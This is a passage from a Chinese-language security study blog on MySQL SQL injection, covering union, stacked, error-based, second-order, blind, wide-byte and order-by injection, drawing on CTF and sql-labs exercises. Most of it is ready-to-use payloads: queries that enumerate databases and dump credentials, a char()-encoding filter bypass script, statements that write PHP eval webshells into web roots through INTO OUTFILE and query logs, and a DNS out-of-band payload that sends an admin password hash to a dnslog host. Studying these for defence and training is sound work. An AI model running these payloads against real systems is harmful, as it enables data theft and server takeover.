class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>sql语句为<code>select</code>,页面有回显查询结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>先通过order by等语句判断列数，再判断哪一列是输出点，最后进行注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联合查询，获取库名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">联合查询，获取表名 </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;已知表名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段值</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(字段1，字段2...) from 已知表名#</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>因为后端查询语句可能只拿第一行查询结果如<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>，所以需要构造一个不存在的值如-1，使得联合查询的结果成为第一行；</p><p>要查的表的名称(这个表是不是在现在使用的数据库中，没有的话表名&#x3D;数据库.表名)</p></blockquote><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><blockquote><p>后端使用的查询函数为<code>mysqli_multi_query()</code> ，支持多条语句查询</p><p>而不是<code>mysqli_query()</code> ，仅支持一条语句查询</p></blockquote><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><ul><li><p>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎的影响</p></li><li><p>无回显：在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略</p><p><strong>解决方法</strong>：可以通过先将内容插入到数据库中，然后再通过查询查出来</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sql语句;--+</span></span><br></pre></td></tr></table></figure><p>可以任意执行sql语句，危害很大</p><h6 id="配合handle绕过关键字"><a href="#配合handle绕过关键字" class="headerlink" title="配合handle绕过关键字"></a>配合handle绕过关键字</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler 表名  open ; handler 表名 read first; #打开表；读取第一条数据</span><br><span class="line">handler 表名 read next;#与上一条语句一起用，读取下一条即第二条数据</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明</a></p><h6 id="配合预编译语句绕过"><a href="#配合预编译语句绕过" class="headerlink" title="配合预编译语句绕过"></a>配合预编译语句绕过</h6><p>使用格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //预定义SQL语句</span><br><span class="line"></span><br><span class="line">execute query;  //执行预定义SQL语句</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>转换脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><strong>使用<code>mysql_error()</code>函数，可以返回上一个Mysql操作产生的文本错误信息。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>最常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpat语法错误，报错信息是有长度限制的，最大长度限制32位,配合substr()等截取字符串函数使用</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>其他<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQL报错注入 </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原型：</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">爆库:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">爆表：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;已知库名&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆列名：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆字段值</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="二次注入–存储型注入"><a href="#二次注入–存储型注入" class="headerlink" title="二次注入–存储型注入"></a>二次注入–存储型注入</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>常见转义函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>以<code>sql-labs Less-24</code>为例</p><p>创建用户</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>使用不恰当的函数<code>mysql_escape_string</code>，功能为在 MySQL 中具有特殊含义的字符（如单引号、双引号、反斜杠和空字节）前添加反斜杠字符。所以脏数据还是进入到了数据库中。</p><p>修改密码处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>直接将脏数据取出并拼接到sql语句中，造成了sql注入。</p><h5 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h5><p>将保存的脏数据从数据库中取出，再次进行sql操作的场景。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改密码，修改订单等修改已保存信息的地方</span><br><span class="line">注册用户名处</span><br></pre></td></tr></table></figure><h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#可控变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#将$_POST[&quot;address&quot;]保存到数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$row保存sql语句查询结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#调用了查询结果</span></span><br></pre></td></tr></table></figure><p>分析上面两条语句，对可控参数address只进行了转义处理，就保存到数据库中。</p><p>并且在update中引用了<code>$row[&#39;address&#39;]</code>，所以在这里存在二次注入。</p><p>可以看到列名为old_address，在进行修改时，会将旧地址保存下来，所以我们只要在第一次修改时，在address处注入恶意代码，第二次修改查询旧地址时就会执行恶意代码。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="盲注–无回显注入"><a href="#盲注–无回显注入" class="headerlink" title="盲注–无回显注入"></a>盲注–无回显注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>页面无数据回显，但是有两种返回状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>实际</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=子查询 --+  </span><br></pre></td></tr></table></figure><p>子查询&#x3D;字符串截取+比较</p><h6 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">逻辑连接符</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">或</td><td align="center">or ，||</td></tr><tr><td align="center">异或</td><td align="center">xor，^</td></tr><tr><td align="center">按位与&#x2F;或</td><td align="center">&amp;，|</td></tr></tbody></table><p>字符串截取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从start位置开始,截取len个字符</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># 从左/右截取len个字符</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>因为大小写不敏感，所以要用<code>binary</code></p><p>BINARY将16进制转化为字符串</p></blockquote><p>语法</p><table><thead><tr><th align="center">like</th><th align="center">正则</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>时间盲注就是<strong>在布尔盲注上加了延迟时间函数sleep()</strong>,用在True和False回显难以区分时,通过页面的响应时间来判断布尔逻辑的正确与否。</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(布尔,A,B)与三目运算符逻辑一样,加上sleep函数</span><br><span class="line"></span><br><span class="line">sleep(if(布尔,A,B))布尔正确,延迟A秒,布尔错误,延迟B秒</span><br><span class="line"></span><br><span class="line">或者 if(布尔,1,sleep(x))布尔正确,无延迟,布尔错误,延迟x秒</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h6><p>能造成延时效果的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过执行多次命令形成延时</span><br><span class="line">benchmark(执行次数,sql语句)</span><br><span class="line"></span><br><span class="line"># 查询一些数据量比较大的表做笛卡尔集运算，导致查询缓慢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>盲注都是需要脚本的，或者用sqlmap</p><h4 id="DNS外带注入"><a href="#DNS外带注入" class="headerlink" title="DNS外带注入"></a>DNS外带注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战-安全客 - 安全资讯平台</a></p><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><ol><li><p>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；</p></li><li><p>windows下存在<code>UNC路径</code></p><blockquote><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul><li>windows系统</li><li><code>secure_file_priv</code>为空</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span></span><br><span class="line"><span class="comment">-- \\\\转义  →  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMB外带注入"><a href="#SMB外带注入" class="headerlink" title="SMB外带注入"></a>SMB外带注入</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>宽字节：如果一个字符的大小是两个字节的，该字符称为宽字节字符</p><p><code>PHP</code>与<code>Mysql</code>之间的交互</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>将php的sql语句以<code>character_set_client</code>编码（也就是转为16进制数），再将16进制数以<code>character_set_connection</code>进行编码（也就是转换为url编码），然后以内部操作字符集进行url解码，最后以<code>character_set_results</code>编码输出结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> 浏览器url自动解码===&gt; β<span class="string">&#x27; 转义===&gt;β\&#x27;转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h5><p><code>sql-lab less-32</code></p><p>转义字符</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>设置编码集</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sql语句，单引号闭合</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>使用 Linux 自带的 iconv 命令进行 UTF 的编码转换</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1�&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><ul><li><p>知道列名的前提下使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(表达式,id,username)</span><br></pre></td></tr></table></figure></li><li><p>不知道列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure></li></ul><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul><li><p>高权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>知道网站的绝对路径</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # show语句要堆叠注入和回显</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>基于联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>和<code>dumpfile</code>的区别</p><ul><li><code>outfile</code>导出数据支持多行，<code>dumpfile</code>只支持一行</li><li><code>outfile</code>会对数据进行转义，<code>dumpfile</code>不会</li></ul><p>所以使用<code>into dumpfile</code>这个函数来写入二进制文件</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>非联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="写入日志文件"><a href="#写入日志文件" class="headerlink" title="写入日志文件"></a>写入日志文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # 这里日志创建权限要低一些，不能在c盘创建</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--结束后，痕迹清理</span><br></pre></td></tr></table></figure><p>日志慢查询</p><p>From：<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>为什么要用慢查询写呢？因为开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--修改日志文件路径</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--查看默认时间值，当sql语句执行时间超过该值才会被计入日志中，默认10秒</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--写shell到慢查询日志</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap  –os-shell"></a>sqlmap  –os-shell</h5><ul><li><p>大致流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取目标信息→使用lines terminated by将具有文件上传的🐎上传到网站→逐级目录访问找到🐎</span><br><span class="line"></span><br><span class="line">→通过该🐎上传真正的命令🐎→测试命令🐎能否执行→删除上传的两个🐎</span><br></pre></td></tr></table></figure></li><li><p>文件上传🐎：form表单</p></li><li><p>php命令马：获得<code>disable_function</code>，遍历所有代码执行，命令执行函数，判断哪一个不在<code>disable_function</code>。</p></li></ul><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><h5 id="LOAD-DATA-LOCAL—任意读取"><a href="#LOAD-DATA-LOCAL—任意读取" class="headerlink" title="LOAD DATA LOCAL—任意读取"></a><code>LOAD DATA LOCAL</code>—任意读取</h5><h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="原理和攻击思路"><a href="#原理和攻击思路" class="headerlink" title="原理和攻击思路"></a>原理和攻击思路</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p><blockquote><p>文件读取<code>Phar</code>文件，造成php反序列化</p></blockquote><h6 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h6><ul><li><p>客户端必须启用LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--local-infile=OFF 可以修复，或者更改全局变量local_infile(我在5.7下参数可以，更改全局变量不行？？)</span><br></pre></td></tr></table></figure></li><li><p>客户端支持非SSL连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--ssl-mode=VERIFY_IDENTITY 可以修复</span><br></pre></td></tr></table></figure></li><li><p>目标web存在连接数据库的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库弱口令扫描，连接检查</span><br><span class="line">网站重装漏洞（需要连接数据库）</span><br><span class="line">数据迁移服务</span><br><span class="line">Excle从数据库中同步数据到表格内</span><br></pre></td></tr></table></figure></li></ul><h6 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h6><figure 